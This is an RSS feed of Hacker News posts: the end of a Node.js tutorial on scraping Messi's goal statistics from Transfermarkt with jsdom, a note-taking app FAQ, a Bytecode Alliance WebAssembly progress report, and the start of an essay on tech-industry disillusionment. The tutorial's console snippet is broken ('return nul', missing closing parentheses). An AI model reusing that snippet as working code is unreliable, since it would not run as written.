<p>That would be the easiest case for parsing, in sophisticated ones you can bump into some pagination, link navigation, dealing with bot protection (captcha), and even real-time site interaction. But all this wouldn’t be covered in the current guide, sorry.</p>
<h2>Fetching</h2>
<p>As an example of this guide, we will scrape a goal data for Messi from Transfermarkt. You can check his stats <a href="https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1">on the site</a>. To load the page from the node environment you will need to use your favorite request library. You can also use the raw HTTP/S module, but it doesn’t even support async, so I’ve picked <a href="https://github.com/node-fetch/node-fetch"><code>node-fetch</code></a> for this task. Your code will look something like:</p>
<div data-language="js"><pre><code><span>const</span> fetch <span>=</span> <span>require</span><span>(</span><span>'node-fetch'</span><span>)</span>

<span>const</span> <span>DATA_URL</span> <span>=</span>
  <span>'https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1'</span>
<span>const</span> <span>loadMessiGoals</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>DATA_URL</span><span>)</span>
  <span>return</span> response<span>.</span><span>text</span><span>(</span><span>)</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>loadMessiGoals<span>}</span></code></pre></div>
<h2>Tools for parsing</h2>
<p>There are two major alternatives for this task which are conveniently represented with two high-quality most-starred and alive libraries.</p>
<figure>
    <span>
      <a href="https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/242b2/parsing-tools.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="cheerio vs jsdom" title="We will use one of them" src="https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/37523/parsing-tools.png" srcset="https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/e9ff0/parsing-tools.png 180w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/f21e7/parsing-tools.png 360w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/37523/parsing-tools.png 720w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/302a4/parsing-tools.png 1080w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/07a9c/parsing-tools.png 1440w,
https://qoob.cc/static/f134010484d4abae1417153e7c2b9e19/242b2/parsing-tools.png 5120w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>We will use one of them</figcaption>
  </figure>
<p>The first approach is just to build a syntax tree from a markup text and then navigate it with familiar browser-like syntax. This one is fully covered with <a href="https://github.com/cheeriojs/cheerio">cheerio</a> that declared as <code>jQuery for server</code> (IMO, they need to revise their marketing vibes for 2020).</p>
<p>The second way is to build the whole browser DOM but without a browser itself. We can do this with wonderful <a href="https://github.com/jsdom/jsdom">jsdom</a> which is <code>node.js implementation of many web standards</code>.</p>
<p>Let’s take a closer look at both of them.</p>
<h3>cheerio</h3>
<p>Despite these analogies cheerio doesn’t have jQuery in dependencies, it just tries to reimplement most known methods from scratch:</p>
<div data-language="json"><pre><code> <span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"@types/node"</span><span>:</span> <span>"^14.11.2"</span><span>,</span>
  <span>"css-select"</span><span>:</span> <span>"~3.1.0"</span><span>,</span>
  <span>"dom-serializer"</span><span>:</span> <span>"~1.1.0"</span><span>,</span>
  <span>"entities"</span><span>:</span> <span>"~2.1.0"</span><span>,</span>
  <span>"htmlparser2"</span><span>:</span> <span>"^5.0.0"</span><span>,</span>
  <span>"lodash"</span><span>:</span> <span>"^4.17.20"</span><span>,</span>
  <span>"parse5"</span><span>:</span> <span>"^6.0.0"</span><span>,</span>
  <span>"parse5-htmlparser2-tree-adapter"</span><span>:</span> <span>"^6.0.0"</span>
<span>}</span></code></pre></div>
<p>Basic usage is really easy:</p>
<ul>
<li>
<p>you load a HTML</p>
<div data-language="js"><pre><code><span>const</span> $ <span>=</span> cheerio<span>.</span><span>load</span><span>(</span><span>'&lt;ul id="steps"&gt;...&lt;/ul&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>done, you’re great, now you can use JQ selectors/methods</p>

</li>
</ul>
<p>Probably you can pick this one if you need to save on size (cheerio is lightweight and fast) or you are really familiar with jQuery syntax and for some reason want to bring it to your new project. Cheerio is a nice way to do any kind of work with HTML you need in your application.</p>
<h3>jsdom</h3>
<p>This one is a bit more complicated: it tries to emulate part of the whole browser that is working with HTML and JS (apart from rendering the result). It’s used heavily for testing and … well scraping.</p>
<p>Let’s spin up jsdom:</p>
<ul>
<li>
<p>you need to use a constructor with your HTML</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span><span>'&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>then you can access standard browser API</p>
<div data-language="js"><pre><code>dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelector</span><span>(</span><span>"p"</span><span>)</span><span>.</span>textContent</code></pre></div>
</li>
</ul>
<p>jsdom is a lot heavier and it does a lot more job. You should understand, why to choose it over other options.</p>
<h2>Parsing</h2>
<p>In our example, I want to stick to the jsdom. It will help us to show one last approach at the end of the article. The parsing part is really vital but very short.</p>
<p>So we’ll start with building a dom from the fetched HTML:</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span>goalsHTML<span>)</span></code></pre></div>
<p>Then you can select table content with css selector and browser API. Don’t forget to create a real array from <code>NodeList</code> that <code>querySelectorAll</code> returns.</p>
<div data-language="js"><pre><code><span>const</span> rows <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table tbody tr'</span><span>)</span>
<span>)</span></code></pre></div>
<p>Now you have a two-dimensional array to work with. This part is finished, now you need to process this data to get clean and ready-to-work-with stats.</p>
<h2>Processing</h2>
<p>First, let’s check the lengths of our rows. Each row is the stat about goal and we mostly don’t care how many do we have. But each row can contain numbers in a different format so we have to deal with them.</p>
<p>We map over rows and get the length. Then we deduplicate results to see what options do we have here.</p>
<div data-language="js"><pre><code><span>const</span> lengths <span>=</span> rows<span>.</span><span>map</span><span>(</span><span>row</span> <span>=&gt;</span> row<span>.</span>length<span>)</span>
<span>const</span> result <span>=</span> <span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span>lengths<span>)</span><span>]</span>
</code></pre></div>
<p>Not that bad, only 4 different shapes: with 1, 5, 14, and 15 cells.
</p><figure>
    <span>
      <a href="https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/55681/rows-example.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="All the possible row cases" title="All the possible row cases" src="https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/37523/rows-example.png" srcset="https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/e9ff0/rows-example.png 180w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/f21e7/rows-example.png 360w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/37523/rows-example.png 720w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/302a4/rows-example.png 1080w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/07a9c/rows-example.png 1440w,
https://qoob.cc/static/e7caf0b723228a308e87229a88fbfb1f/55681/rows-example.png 2062w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>All the possible row cases</figcaption>
  </figure>
<p>Since we don’t need rank data from extra cell in 15-cells case it is safe to delete it.</p>
<div data-language="js"><pre><code><span>const</span> <span>omitRank</span> <span>=</span> <span>(</span><span>row</span><span>)</span> <span>=&gt;</span>
  row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row</code></pre></div>
<p>Row with only one cell is actually useless: it is just a name of the season, so we will skip it.</p>
<div data-language="js"><pre><code><span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> <span>null</span></code></pre></div>
<p>For the 5-cells case (when player scored few goals in one match) we need to find previous full row and use it’s data for empty stats.</p>
<div data-language="js"><pre><code><span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
  goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals<span>)</span>

<span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals<span>)</span>
<span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span></code></pre></div>
<p>Now we just have to manually map data to keys, nothing scientific here and no smart way to avoid it.</p>
<div data-language="js"><pre><code><span>return</span> <span>{</span>
  competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
  matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>
  date<span>:</span> match<span>[</span><span>3</span><span>]</span><span>,</span>
  venue<span>:</span> match<span>[</span><span>4</span><span>]</span><span>,</span>
  opponent<span>:</span> match<span>[</span><span>7</span><span>]</span><span>,</span>
  result<span>:</span> match<span>[</span><span>8</span><span>]</span><span>,</span>
  position<span>:</span> match<span>[</span><span>9</span><span>]</span><span>,</span>
  minute<span>:</span> row<span>[</span><span>1</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  atScore<span>:</span> row<span>[</span><span>2</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  goalType<span>:</span> row<span>[</span><span>3</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  assist<span>:</span> row<span>[</span><span>4</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
<span>}</span></code></pre></div>
<h2>Saving</h2>
<p>We would just dump our result to a file, converting it to a string first with the <code>JSON.stringify</code> method.</p>
<div data-language="js"><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><span>.</span>promises

<span>const</span> <span>saveStats</span> <span>=</span> <span>async</span> <span>(</span><span>data</span><span>)</span> <span>=&gt;</span> <span>{</span>
  fs<span>.</span><span>writeFile</span><span>(</span><span>'./data.json'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span>data<span>)</span><span>)</span>
<span>}</span></code></pre></div>
<blockquote>
<h2>Bonus: One-time parsing with a snippet</h2>
</blockquote>
<p>Since we used <code>jsdom</code> with the browser-compatible API we actually don’t need any node environment to parse the data. If we just need it once from a particular page we can just run some code at the <code>Console</code> tab in the developers tools of your browser. Try to open <a href="https://www.transfermarkt.com/cristiano-ronaldo/alletore/spieler/8198/plus/1">any player stats on Transfermarkt</a> and paste this giant non-readable snippet to the console:</p>
<div data-language="js"><pre><code><span>let</span> data <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table table tbody tr'</span><span>)</span>
<span>)</span><span>.</span><span>map</span><span>(</span>
  <span>row</span> <span>=&gt;</span> Array<span>.</span><span>from</span><span>(</span>row<span>.</span>children<span>)</span><span>.</span><span>map</span><span>(</span><span>node</span> <span>=&gt;</span> node<span>.</span>textContent<span>.</span><span>trim</span><span>(</span><span>)</span><span>)</span>
<span>)</span><span>.</span><span>map</span><span>(</span>
  <span>(</span><span>row</span><span>)</span> <span>=&gt;</span> row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row
<span>)</span><span>.</span><span>map</span><span>(</span>
  <span>(</span><span>row<span>,</span> idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> nul

  <span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
    goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals
  <span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals
  <span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span>

  <span>return</span> <span>{</span>
    competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
    matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>
    date<span>:</span> match<span>[</span><span>3</span><span>]</span><span>,</span>
    venue<span>:</span> match<span>[</span><span>4</span><span>]</span><span>,</span>
    opponent<span>:</span> match<span>[</span><span>7</span><span>]</span><span>,</span>
    result<span>:</span> match<span>[</span><span>8</span><span>]</span><span>,</span>
    position<span>:</span> match<span>[</span><span>9</span><span>]</span><span>,</span>
    minute<span>:</span> row<span>[</span><span>1</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
    atScore<span>:</span> row<span>[</span><span>2</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
    goalType<span>:</span> row<span>[</span><span>3</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
    assist<span>:</span> row<span>[</span><span>4</span> <span>+</span> isSameMatch <span>*</span> <span>9</span><span>]</span><span>,</span>
  <span>}</span><span>}</span>
<span>)</span><span>.</span><span>filter</span><span>(</span>Boolean<span>)</span></code></pre></div>
<p>And now just apply this magic <code>copy</code> function that is integrated into the browser devtools. It would copy data to your clipboard.</p>

<p>Not that hard, right? And no need to deal with <code>pip</code> anymore. I hope you found this article useful. Stay tuned, next time we will visualize this scraped data with modern JS libs.</p>
<p>You can find whole script for this article in the following codesandbox:</p>
</div></div>]]>
            </description>
            <link>https://qoob.cc/web-scraping/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24898016</guid>
            <pubDate>Mon, 26 Oct 2020 16:34:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Personal CRM: Note taking, the way it should be]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 119 (<a href="https://news.ycombinator.com/item?id=24897812">thread link</a>) | @nathanganser
<br/>
October 26, 2020 | https://nat.app/calendar | <a href="https://web.archive.org/web/*/https://nat.app/calendar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>Can I export my notes?</h3><p>Of course, just email us at <a href="mailto:export@nat.app">export@nat.app</a> and we'll send you a CSV with all the notes you've taken.</p></div><div><h3>Will you stick around?</h3><p>Yes. Because we are building this for ourselves. We need this product as much as you do. Also, we're profitable and bootstrapped.</p></div><div><h3>Is my data safe?</h3><p>Yes, we don't read your emails and use top-notch security standards. Check out our page on privacy (link in the header) to find out more.</p></div><div><h3>I have a question (or a problem?)</h3><p>We're always available. Just email us at <a href="mailto:question@nat.app">question@nat.app</a> and we'll get back to you (or fix your issue!)</p></div></div></div>]]>
            </description>
            <link>https://nat.app/calendar</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897812</guid>
            <pubDate>Mon, 26 Oct 2020 16:20:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fastly hires entire Wasmtime team from Mozilla]]>
            </title>
            <description>
<![CDATA[
Score 802 | Comments 134 (<a href="https://news.ycombinator.com/item?id=24897641">thread link</a>) | @swyx
<br/>
October 26, 2020 | https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces | <a href="https://web.archive.org/web/*/https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>We announced the Bytecode Alliance nearly a year ago, and since then it has been… quite a year 😬</p>

<p>While the 2020-ness of this year has slowed us down on some fronts, we’ve also made a lot of progress on others.</p>

<p>Now that we’ve adjusted to the new normal, we’re gearing up to accelerate on <em>all</em> fronts. But before we do that, we wanted to share some highlights of what we’ve achieved to date.</p>

<h2 id="progress-on-the-nanoprocess-model">Progress on the nanoprocess model</h2>

<p>Our goal is to evolve WebAssembly from a compilation target that you compile monolithic applications <em>to</em>, to a modular ecosystem that you compose applications <em>from</em>.</p>

<p>As we do this, we have a chance to fix many longstanding problems with the way software is developed. For example, we can make it much safer for your application to use dependencies that you didn’t code yourself.</p>

<p>This is why the <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/">nanoprocess model</a> is so important. It’s the paradigm shift necessary to empower developers to defend themselves against these problems.</p>

<p>There are three core pieces of the nanoprocess model that are still in progress:</p>
<ul>
  <li>WASI, the WebAssembly System Interface</li>
  <li>Module linking</li>
  <li>Interface types</li>
</ul>

<p>You can think of WASI as the way that the host and a WebAssembly module talk to each other.</p>

<p>You can think of module linking as the way that two WebAssembly modules talk to each other.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-wasi-module-linking.png" alt="On the left, a WebAssembly module and host talking to each other using WASI. On the right, two WebAssembly modules talking to each other using module linking."></p>

<p>In both of these cases, the two sides are often written in different source languages. This means they might represent values and handles to resources in different ways. Basically, they speak foreign languages.</p>

<p>Interface types are like a foreign-language dictionary that the engine uses to help them communicate.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-interface-types.png" alt="On both sides, the engine helps the two talk to each other using interface types."></p>

<p>Let’s see where the work on these stands today.</p>

<p><em>Note: The Bytecode Alliance doesn’t host specifications. While BA members are driving specs mentioned below, they are doing that in collaboration with others in the W3C WebAssembly CG. Bytecode Alliance projects include implementations of these specs.</em></p>

<h3 id="wasi-the-webassembly-system-interface">WASI, the WebAssembly System Interface</h3>

<p>When we introduced WASI, we compared it to <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> and other system interfaces. That was a bit of an oversimplification, though.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasi-low-level.png" alt="A file directory structure on the left, with a protective barrier in the middle containing the operating system kernel, and an application knocking for access on the right"></p>

<p>While WASI does aim to provide a set of standardized modules that provide these low-level system interface operations, we also intend to standardize modules for specialized higher-level host APIs.</p>

<p>We’ve made progress on both of these fronts.</p>

<h4 id="low-level-system-interface-level">Low-level system interface level</h4>
<p>For the low-level system interface level, the work has been focused on quality of implementation.</p>

<p>On the spec side, that has been identifying and addressing problems with cross-platform implementability of the spec. One example of this is the <a href="https://github.com/WebAssembly/WASI/pull/312"><code>wasi-socket</code></a> API (which was <a href="https://radu-matei.com/blog/towards-sockets-networking-wasi/">recently prototyped in Wasmtime</a>). In this case, the conversation has centered on the right way to apply capabilities-based security to the handling of sockets.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/portability.png" alt="A .wasm file running across three different operating systems"></p>

<p>On the implementation side, we’ve done a lot of work to improve the security and reliability of our implementation. Part of this has been developing robust fuzzing measures (which we describe more below).</p>

<p>Another thing we’ve done is factored out the security-critical operations into a dedicated library, <a href="https://github.com/bytecodealliance/cap-std"><code>cap-std</code></a>. It’s a cross-platform library which provides much of the functionality of Rust’s standard library in a capabilities-oriented way. This allows us to fully focus on getting those security-critical foundations right on all platforms. As a next step, we’ll make use of <code>cap-std</code> in our WASI implementation.</p>

<h4 id="specialized-higher-level-host-apis">Specialized higher-level host APIs</h4>
<p>For the specialized higher-level host APIs, there has been exciting work on proposals for completely new API modules.</p>

<p>One great example of this is <a href="https://github.com/WebAssembly/wasi-nn"><code>wasi-nn</code></a>, which is a <a href="https://www.youtube.com/watch?v=6O44X76rgIg">standardized interface for neural networking</a>. This is useful because trained machine learning models are typically deployed on a variety of different devices with different architectures and operating systems. Using <code>wasi-nn</code>, the <code>.wasm</code> file can do things like describe tensors and execute inference requests in a portable way, regardless of the underlying ISA and OS.</p>

<p>We’re implementing all of these in Wasmtime as they develop. That way, people can try them out and real world usage can inform the specification.</p>

<h3 id="module-linking">Module linking</h3>

<p>If we’re going to have an ecosystem of reusable code, we need a good way to link modules together.</p>

<p>Right now, you can link modules together using host APIs. For example, on the web you can string together a bunch of <code>WebAssembly.instantiate</code> calls to link a set of modules together. In Wasmtime, you use the <a href="https://bytecodealliance.github.io/wasmtime/examples-c-linking.html">linker APIs</a>.</p>

<p>But there are a few downsides to this imperative style, including the fact that it’s fairly cumbersome, not that fast and requires the host to include some type of garbage or cycle collector.</p>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces">https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces</a></em></p>]]>
            </description>
            <link>https://bytecodealliance.org/articles/1-year-update#the-lucet-and-wasmtime-teams-join-forces</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897641</guid>
            <pubDate>Mon, 26 Oct 2020 16:06:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Surviving Disillusionment]]>
            </title>
            <description>
<![CDATA[
Score 303 | Comments 167 (<a href="https://news.ycombinator.com/item?id=24896650">thread link</a>) | @mwcampbell
<br/>
October 26, 2020 | https://www.spakhm.com/p/surviving-disillusionment | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/surviving-disillusionment">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past few weeks I wrote about <a href="https://www.spakhm.com/p/how-to-get-promoted">corporate politics</a>, <a href="https://www.spakhm.com/p/parallel-tracks">distribution of power</a>, and <a href="https://www.spakhm.com/p/an-open-letter-to-my-friends-with">disregard for ethics</a>. Dozens of people reached out to say the posts were dark, cynical and depressingly accurate. There are more dark posts I can write— about lies in venture capital, the devastating price of failure, the destructive aspect of creative relationships, the ubiquity of envy. But I think I've gotten my point across. The industry can be depressing. I now want to concentrate on a different question: what to do with this knowledge.</p><p>The word "possession" means owning things, but it also means things owning you. Knowledge can possess people. Once you observe the darker side of human nature in the technology industry, you cannot forget or unsee it. The subsequent cynicism can be so disheartening that the romance of the computer revolution is beat out of people completely.</p><p>I've met many engineers with extraordinary talent who decided to stop making software. They wanted to program computers all their lives. They were born for it. After spending six, eight, ten years in the industry, they quit for good. Now they're running breweries and hydroponic farms, with no desire to ever again touch a compiler, let alone get back into the fray.</p><p>There is nothing wrong with brewing beer or growing hydroponic tomatoes. What's sad is that people weren't pulled into their new occupation by better financial opportunities or conviction; instead they were pushed away from technology. If brewing paid as much as programming, it still wouldn't have been their first choice. Something had to have gone wrong for them to abandon their first love.</p><p>In <a href="https://amzn.to/35ATS95">Zen Mind, Beginner's Mind</a>, Shunryu Suzuki says:</p><blockquote><p>For us, the monastic life was the usual life, and the people who came from the city were unusual people. When we saw them we felt, “Oh, some unusual people have come!” But once I had left Eiheiji and been away for some time, coming back was different. I heard the various sounds of practice—the bells and the monks reciting the sutra—and I had a deep feeling. There were tears flowing out of my eyes, 